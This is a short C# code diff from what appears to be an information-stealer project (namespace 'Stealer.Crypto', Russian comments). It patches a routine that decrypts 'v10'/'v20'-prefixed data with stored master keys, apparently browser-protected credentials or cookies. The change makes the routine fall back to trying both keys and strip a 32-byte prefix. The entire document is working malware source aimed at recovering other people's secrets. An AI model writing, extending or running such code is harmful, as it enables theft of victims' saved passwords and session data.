@@ -36,8 +36,26 @@ namespace Stealer.Crypto
                 byte[] masterKey = prefix == "v20" ? masterKeyV20 : 
                                    prefix == "v10" ? masterKeyV10 : null;
 
+                // Если префикс не определился или неизвестен — пробуем оба ключа по очереди
                 if (masterKey == null)
-                    return null;
+                {
+                    byte[] dec = null;
+                    if (masterKeyV10 != null)
+                        dec = AesGcm256.Decrypt(masterKeyV10, nonce, null, ciphertext, tag);
+                    if (dec == null && masterKeyV20 != null)
+                        dec = AesGcm256.Decrypt(masterKeyV20, nonce, null, ciphertext, tag);
+                    
+                    if (dec == null)
+                        return null;
+
+                    if (checkPrefix && dec.Length > 32 && HasPrefix(dec))
+                    {
+                        byte[] result = new byte[dec.Length - 32];
+                        Array.Copy(dec, 32, result, 0, result.Length);
+                        return result;
+                    }
+                    return dec;
+                }
 
                 // Расшифровываем
                 byte[] decrypted = AesGcm256.Decrypt(masterKey, nonce, null, ciphertext, tag);
